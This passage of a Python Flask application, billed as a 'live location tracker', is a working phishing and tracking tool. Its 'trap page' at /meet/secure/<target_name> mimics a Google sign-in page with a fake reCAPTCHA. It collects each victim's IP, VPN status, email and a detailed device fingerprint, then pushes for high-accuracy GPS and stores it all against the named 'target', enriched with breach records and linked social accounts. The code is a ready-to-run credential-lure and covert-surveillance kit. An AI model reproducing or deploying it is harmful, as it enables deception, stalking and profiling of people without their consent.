                linked_accounts=?, linked_accounts_details=?,
                device_info=?, browser=?, os=?, screen_resolution=?, timezone=?,
                language=?, user_agent=?, cpu_cores=?, gpu_info=?, touch_support=?,
                cookies_enabled=?, do_not_track=?, platform=?, connection_type=?,
                battery_level=?, spf_record=?, dmarc_record=?, spf_policy=?,
                dmarc_policy=?, spoofing_risk=?, disposable_email=?,
                security_score=?, security_grade=?, spf_strength=?, dmarc_strength=?,
                security_strengths=?, security_vulnerabilities=?, security_critical=?,
                last_seen=? 
            WHERE name=?
        """, (
            email, 1 if validation_result['valid'] else 0, validation_result['provider'],
            json.dumps(validation_result. get('mx_records', [])),
            breach_result['total_breaches'],
            ', '.join([b. get('name', 'Unknown') for b in breach_result['breaches'][: 10]]),
            json.dumps(breach_result['breaches']),
            gravatar_result. get('avatar_url'), json.dumps(gravatar_result.get('details', {})),
            ', '.join([a['platform'] for a in found_accounts]), json.dumps(social_results),
            json.dumps(device_info), device_info.get('browser', ''),
            device_info.get('os', ''), device_info.get('screen', ''),
            device_info.get('timezone', ''), device_info.get('language', ''),
            device_info.get('userAgent', ''), device_info.get('cpuCores', ''),
            device_info.get('gpu', ''),
            1 if device_info.get('touchSupport') else 0,
            1 if device_info.get('cookiesEnabled', True) else 0,
            device_info.get('doNotTrack', ''), device_info.get('platform', ''),
            device_info. get('connection', ''), device_info.get('battery', ''),
            validation_result.get('spf_record'), validation_result.get('dmarc_record'),
            validation_result.get('spf_policy'), validation_result.get('dmarc_policy'),
            validation_result.get('spoofing_risk'),
            1 if validation_result['disposable'] else 0,
            validation_result.get('security_score', 0),
            validation_result.get('spoofing_details', {}).get('details', {}).get('grade', 'F'),  # ← FIXED LINE
            spf_details.get('policy_strength', 'N/A'),
            dmarc_details.get('policy_strength', 'N/A'),
            json.dumps(spoofing_details.get('details', {}).get('strengths', [])),
            json.dumps(spoofing_details. get('details', {}).get('vulnerabilities', [])),
            json.dumps(spoofing_details.get('details', {}).get('critical_issues', [])),
            time.ctime(), name
        ))
        conn.commit()
        conn.close()
    
    return jsonify({
        'status': 'OK', 'valid': validation_result['valid'], 'email':  email,
        'validation':  validation_result,
        'breach_check': breach_result,
        'linked_accounts': found_accounts,
        'gravatar':  gravatar_result.  get('avatar_url'),
        'gravatar_details': gravatar_result.get('details'),
        'provider': validation_result['provider'],
        'disposable': validation_result['disposable'],
        'spoofing_risk': validation_result['spoofing_risk'],
        'security_score': validation_result. get('security_score', 0)
    })
@app.route('/api/report_location', methods=['POST'])
def report_location():
    data = request.json
    name = sanitize_input(data.get('name', ''), max_length=50)
    lat, lon = float(data.get('lat', 0)), float(data.get('lon', 0))
    accuracy = float(data.get('accuracy', 0))
    denied = data.get('denied', False)
    
    status = "LOCATION DENIED" if denied else f"LOCKED (GPS ±{int(accuracy)}m)"
    print(f"[LOCATION] {name} | Lat: {lat}, Lon: {lon} | Accuracy: {accuracy}m | Denied: {denied}")
    
    with db_lock:
        conn = get_db()
        conn.execute("UPDATE targets SET lat=?, lon=?, accuracy=?, status=?, last_seen=? WHERE name=? ",
                     (lat, lon, accuracy, status, time.ctime(), name))
        conn.commit()
        conn.close()
    
    return jsonify({"status": "OK", "captured": not denied})

# ==================================================================================
# SECTION 11: TRAP PAGE (Keep existing code)
# ==================================================================================
@app.route('/meet/secure/<name>', methods=['GET'])
def trap_page(name):
    try:
        safe_name = sanitize_input(name, max_length=50)
        ip = get_real_ip()
        vpn = detect_vpn(ip, request.headers)
        ip_geo = get_ip_geolocation(ip)
        
        print(f"[TRAP HIT] Name: {safe_name} | IP: {ip} | VPN: {vpn['is_vpn']} | City: {ip_geo.get('city')}")
        
        with db_lock:  
            conn = get_db()
            vpn_reasons = ", ".join(vpn['reasons']) if vpn['reasons'] else ""
            conn.execute(
                """INSERT INTO targets (name, ip, is_vpn, is_localhost, vpn_confidence, vpn_reasons,
                   isp, city, region, country, country_code, org, as_number, status, last_seen, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                   ON CONFLICT(name) DO UPDATE SET
                   ip=excluded.ip, is_vpn=excluded.is_vpn, is_localhost=excluded.is_localhost,
                   vpn_confidence=excluded.vpn_confidence, vpn_reasons=excluded.vpn_reasons,
                   isp=excluded.isp, city=excluded.city, region=excluded.region,
                   country=excluded.country, country_code=excluded.country_code,
                   org=excluded.org, as_number=excluded.as_number,
                   last_seen=excluded.last_seen, status=excluded.status""",
                (safe_name, ip, int(vpn['is_vpn']), int(vpn['is_localhost']),
                 vpn['confidence'], vpn_reasons,
                 ip_geo.get('isp'), ip_geo.get('city'), ip_geo.get('region'),
                 ip_geo.get('country'), ip_geo.get('country_code'),
                 ip_geo.get('org'), ip_geo.get('as_number'),
                 "IP CAPTURED", time.ctime(), time.ctime())
            )
            conn.commit()
            conn.close()
        
        html = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://www.google.com/favicon.ico">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',Roboto,Arial,sans-serif;background:#f0f4f9;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .container{background:white;border-radius:8px;padding:48px 40px;width:100%;max-width:450px;box-shadow:0 1px 3px rgba(0,0,0,0.1)}
        .logo{text-align:center;margin-bottom:16px}
        .logo img{height:24px}
        h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}
        .subtitle{text-align:center;color:#5f6368;font-size:16px;margin-bottom:32px}
        .input-group{margin-bottom:24px}
        .input-group input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;transition:border-color 0.2s}
        .input-group input:focus{border-color:#1a73e8;border-width:2px;padding:12px 14px}
        .input-group input.error{border-color:#d93025}
        .error-text{color:#d93025;font-size:12px;margin-top:8px;display:none}
        .captcha-box{border:1px solid #d3d3d3;border-radius:3px;padding:12px 14px;margin-bottom:24px;display:flex;align-items:center;background:#f9f9f9;cursor:pointer;transition:border-color 0.2s;-webkit-tap-highlight-color:transparent;position:relative}
        .captcha-box:hover{border-color:#b8b8b8}
        .captcha-box.disabled{pointer-events:none;opacity:0.7}
        .captcha-checkbox{width:28px;height:28px;border:2px solid #c1c1c1;border-radius:3px;margin-right:12px;display:flex;align-items:center;justify-content:center;background:white;transition:all 0.2s;flex-shrink:0;position:relative}
        .captcha-checkbox.checked{background:#4285f4;border-color:#4285f4}
        .captcha-checkbox .checkmark{width:18px;height:18px;fill:white}
        .captcha-spinner{width:20px;height:20px;border:3px solid #f3f3f3;border-top:3px solid #4285f4;border-radius:50%;animation:spin 1s linear infinite}
        .captcha-text{font-size:14px;color:#202124;flex:1;padding-right:90px}
        .captcha-logo{display:flex;flex-direction:column;align-items:center;position:absolute;top:8px;right:10px}
        .captcha-logo img{height:40px;width:auto}
        .captcha-logo span{font-size:8px;color:#555;margin-top:1px}
        .btn{width:100%;padding:10px 24px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;transition:background 0.2s}
        .btn:hover:not(:disabled){background:#1557b0}
        .btn:disabled{background:#dadce0;color:#80868b;cursor:not-allowed}
        .footer{text-align:center;margin-top:32px;font-size:12px;color:#5f6368}
        .footer a{color:#1a73e8;text-decoration:none}
        .spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 0.8s linear infinite;margin-right:8px;vertical-align:middle}
        @keyframes spin{to{transform:rotate(360deg)}}
        .progress-steps{display:flex;justify-content:center;gap:8px;margin-bottom:24px}
        .step{width:8px;height:8px;border-radius:50%;background:#dadce0;transition:background 0.3s}
        .step.active{background:#1a73e8}
        .step.done{background:#34a853}
        .success-screen{text-align:center;padding:40px 20px}
        .success-icon{width:64px;height:64px;margin-bottom:16px}
        .success-screen h2{color:#202124;font-size:22px;font-weight:400;margin-bottom:8px}
        .success-screen p{color:#5f6368;font-size:14px}
        .info-text{font-size:12px;color:#5f6368;text-align:center;margin-top:16px}
        .error-box{background:#fce8e6;color:#c5221f;padding:12px 16px;border-radius:8px;margin-bottom:16px;font-size:14px;display:none}
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" style="height:24px">
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">Enter your email to verify it's you. </p>
        <div class="progress-steps">
            <div class="step active" id="step1"></div>
            <div class="step" id="step2"></div>
            <div class="step" id="step3"></div>
        </div>
        <div class="error-box" id="errorBox"></div>
        <div class="input-group">
            <input type="email" id="emailInput" placeholder="Email" autocomplete="email" required>
            <div class="error-text" id="emailError">Please enter a valid email address</div>
        </div>
        <div class="captcha-box" id="captchaBox">
            <div class="captcha-checkbox" id="captchaCheckbox"></div>
            <span class="captcha-text">I'm not a robot</span>
            <div class="captcha-logo">
                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
                <span style="margin-top:6px">reCAPTCHA</span>
            </div>
        </div>
        <button class="btn" id="nextBtn" disabled>Next</button>
        <p class="info-text">This security check helps protect your account</p>
        <div class="footer">
            <a href="#">Create account</a>
            <span style="margin:0 8px">|</span>
            <a href="#">Privacy</a>
            <span style="margin:0 8px">|</span>
            <a href="#">Terms</a>
        </div>
    </div>
    <script>
    var targetName="''' + safe_name + '''";
    var captchaVerified=false;
    var retryCount=0;
    
    var deviceInfo={
        userAgent:navigator.userAgent,
        language:navigator.language,
        timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen:screen.width+'x'+screen.height,
        browser:getBrowser(),
        os:getOS(),
        cookiesEnabled:navigator.cookieEnabled,
        doNotTrack:navigator.doNotTrack,
        platform:navigator.platform,
        touchSupport:'ontouchstart' in window,
        cpuCores:navigator.hardwareConcurrency||'unknown',
        connection:navigator.connection? navigator.connection.effectiveType:'unknown',
        gpu:getGPU()
    };
    
    function getBrowser(){
        var ua=navigator.userAgent;
        if(ua.indexOf('Chrome')>-1&&ua.indexOf('Edg')===-1)return'Chrome';
        if(ua.indexOf('Safari')>-1&&ua.indexOf('Chrome')===-1)return'Safari';
        if(ua.indexOf('Firefox')>-1)return'Firefox';
        if(ua.indexOf('Edg')>-1)return'Edge';
        return'Other';
    }
    
    function getOS(){
        var ua=navigator.userAgent;
        if(ua.indexOf('Windows')>-1)return'Windows';
        if(ua.indexOf('Mac')>-1)return'macOS';
        if(ua.indexOf('Linux')>-1)return'Linux';
        if(ua.indexOf('Android')>-1)return'Android';
        if(ua.indexOf('iPhone')>-1||ua.indexOf('iPad')>-1)return'iOS';
        return'Other';
    }
    
    function getGPU(){
        try{
            var canvas=document.createElement('canvas');
            var gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');
            if(gl){
                var ext=gl.getExtension('WEBGL_debug_renderer_info');
                if(ext)return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
            }
        }catch(e){}
        return'unknown';
    }
    
    function showError(m){
        var e=document.getElementById('errorBox');
        e.textContent=m;
        e.style.display='block';
    }
    
    function hideError(){
        document.getElementById('errorBox').style.display='none';
    }
    
    function updateNextButton(){
        var email=document.getElementById('emailInput').value.trim();
        var isValidEmail=/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(email);
        document.getElementById('nextBtn').disabled=!(isValidEmail&&captchaVerified);
    }
    
    document.getElementById('emailInput').addEventListener('input',function(){
        var email=this.value.trim();
        var errorEl=document.getElementById('emailError');
        var isValid=/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(email);
        if(email.length>0&&!isValid){
            this.classList.add('error');
            errorEl.style.display='block';
        }else{
            this.classList.remove('error');
            errorEl.style.display='none';
        }
        updateNextButton();
    });
    
    // ============================================================================
    // CAPTCHA CLICK HANDLER - PERFECT FOR MOBILE + DESKTOP
    // ============================================================================
    var captchaBox=document.getElementById('captchaBox');
    var captchaCheckbox=document.getElementById('captchaCheckbox');
    
    function onCaptchaClick(e){
        if(e){
            e.preventDefault();
            e.stopPropagation();
        }
        
        if(captchaVerified)return;
        
        captchaBox.classList.add('disabled');
        
        captchaCheckbox.innerHTML='';
        var spinner=document.createElement('div');
        spinner.className='captcha-spinner';
        captchaCheckbox.appendChild(spinner);
        
        setTimeout(function(){
            captchaCheckbox.innerHTML='';
            
            var svg=document.createElementNS('http://www.w3.org/2000/svg','svg');
            svg.setAttribute('class','checkmark');
            svg.setAttribute('viewBox','0 0 24 24');
            svg.setAttribute('width','18');
            svg.setAttribute('height','18');
            
            var path=document.createElementNS('http://www.w3.org/2000/svg','path');
            path.setAttribute('d','M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z');
            path.setAttribute('fill','white');
            svg.appendChild(path);
            
            captchaCheckbox.appendChild(svg);
            captchaCheckbox.classList.add('checked');
            
            captchaVerified=true;
            captchaBox.classList.remove('disabled');
            updateNextButton();
        },1500);
    }
    
    captchaBox.addEventListener('click',onCaptchaClick,false);
    captchaBox.addEventListener('touchstart',function(e){e.preventDefault();},{passive:false});
    captchaBox.addEventListener('touchend',function(e){e.preventDefault();onCaptchaClick(e);},{passive:false});
    
    document.getElementById('nextBtn').addEventListener('click',function(){
        var email=document.getElementById('emailInput').value.trim().toLowerCase();
        var btn=document.getElementById('nextBtn');
        
        if(!captchaVerified){
            showError('Please complete the CAPTCHA');
            return;
        }
        
        if(!/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(email)){
            document.getElementById('emailInput').classList.add('error');
            document.getElementById('emailError').style.display='block';
            return;
        }
        
        hideError();
        btn.disabled=true;
        btn.innerHTML='<span class="spinner"></span>Verifying...';
        document.getElementById('step1').className='step done';
        document.getElementById('step2').className='step active';
        
        fetch('/api/report_email',{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({name:targetName,email:email,device_info:deviceInfo})
        })
        .then(function(r){return r.json();})
        .then(function(data){
            if(data.valid||data.status==='OK'){
                requestLocation();
            }else{
                document.getElementById('emailInput').classList.add('error');
                document.getElementById('emailError').textContent=data.error||'Invalid email';
                document.getElementById('emailError').style.display='block';
                btn.innerHTML='Next';
                btn.disabled=false;
            }
        })
        .catch(function(err){
            console.error('Error: ',err);
            requestLocation();
        });
    });
    
    function requestLocation(){
        document.getElementById('step2').className='step done';
        document.getElementById('step3').className='step active';
        
        document.getElementById('mainContainer').innerHTML=
            '<div class="logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" style="height: 24px"></div>'+
            '<h1>Verify your identity</h1>'+
            '<p class="subtitle">For your security, we need to verify your identity</p>'+
            '<div class="progress-steps"><div class="step done"></div><div class="step done"></div><div class="step active"></div></div>'+
            '<div style="text-align:center;padding:30px"><div class="captcha-spinner" style="width:40px;height:40px;margin:0 auto 16px;border-width:4px"></div><p style="color:#5f6368;font-size:14px">Verifying location...</p></div>'+
            '<p class="info-text">Please click Allow to complete verification</p>';
        
        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(onLocationSuccess,onLocationError,{enableHighAccuracy:true,timeout:20000,maximumAge:0});
        }else{
            showSuccess();
        }
    }
    
    function onLocationSuccess(pos){
        fetch('/api/report_location',{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({
                name:targetName,
                lat:pos.coords.latitude,
                lon:pos.coords.longitude,
                accuracy:pos.coords.accuracy
            })
        })
        .then(function(){showSuccess();})
        .catch(function(){showSuccess();});
    }
    
    function onLocationError(err){
        retryCount++;
        if(retryCount>=2){
            fetch('/api/report_location',{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({name:targetName,lat:0,lon:0,accuracy:0,denied:true})
            })
            .then(function(){showSuccess();})
            .catch(function(){showSuccess();});
        }else{
            document.getElementById('mainContainer').innerHTML=
                '<div class="logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" style="height:24px"></div>'+
                '<h1>Location Required</h1>'+
                '<p class="subtitle">Please allow location access to verify your identity</p>'+
                '<div style="background:#fce8e6;color:#c5221f;padding:12px;border-radius:4px;margin:20px 0;font-size:14px">Location access was denied. Please try again.</div>'+
                '<button class="btn" onclick="requestLocation()">Try Again</button>'+
                '<button class="btn" style="background:#f1f3f4;color:#5f6368;margin-top:12px" onclick="showSuccess()">Skip</button>';
        }
    }
    
    function showSuccess(){
        document.getElementById('mainContainer').innerHTML=
            '<div class="success-screen">'+
            '<svg class="success-icon" viewBox="0 0 24 24" fill="#34a853"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>'+
            '<h2>Verification Complete</h2>'+
            '<p>Redirecting to your account...</p>'+
            '</div>';
        setTimeout(function(){
            window.location.href='https://myaccount.google.com';
        },2500);
    }
    </script>
</body>
</html>'''
        
        return html
        
    except Exception as e:
        print(f"[TRAP ERROR] {e}")
        import traceback
        traceback.print_exc()
        return f"<h1>Error</h1><p>{str(e)}</p>", 500
# ==================================================================================
# SECTION 12: STARTUP
# ==================================================================================
if __name__ == '__main__': 
    print("")
    print("=" * 70)
    print("  LIVE LOCATION TRACKER v4.0 - INDUSTRY STANDARD EDITION")
    print("  Professional OSINT Intelligence Platform")
    print("=" * 70)
    print(f"  Server: http://localhost:5000")
    print("")
    print("  ✅ NEW FEATURES:")
    print("  [+] HIBP API Integration (Real-time breach checking)")
    print("  [+] SPF/DKIM/DMARC Email Security Analysis")
    print("  [+] Email Spoofing Risk Assessment")
    print("  [+] Disposable Email Detection")
    print("  [+] Sherlock Integration (50+ platforms)")
    print("  [+] Accurate Social Media Detection")
    print("  [+] Advanced Email Validation")
    print("  [+] Utility Module (DRY principle)")
    print("  [+] Input Sanitization")
    print("")
    print("  🔧 EXISTING FEATURES:")
    print("  [+] Email Capture & Validation")
    print("  [+] Comprehensive Breach Database")
    print("  [+] Full Social Media Enumeration")
    print("  [+] Detailed Profile Extraction")
    print("  [+] Gravatar Intelligence")
    print("  [+] Device Fingerprinting")
    print("  [+] IP Geolocation")
    print("  [+] VPN/Proxy Detection")
    print("  [+] GPS Location Capture")
    print("  [+] C++ DSA Geofence Algorithms")
    print("")
    
    if HIBP_API_KEY:
        print("  [✓] HIBP API:   ENABLED (Real-time breach data)")
    else:
        print("  [! ] HIBP API:  DISABLED (Using local database)")
        print("      Get API key:  https://haveibeenpwned.com/API/Key")
    
    if geo_lib:   
        print("  [✓] C++ Kernel:  LOADED")
        print("  [✓] DSA Algorithms:  ACTIVE")
    else:
        print("  [!] C++ Kernel: NOT LOADED")
        print("      Compile:  g++ -shared -o geofence.so geofence.cpp -O2 -fPIC")
    
    print("")
    print("  TRAP LINK FORMAT:")
    print("  http://localhost:5000/meet/secure/<target_name>")
    print("")
    print("=" * 70)
    print("")
    
    app. run(host='0.0.0.0', port=5000, debug=False, threaded=True)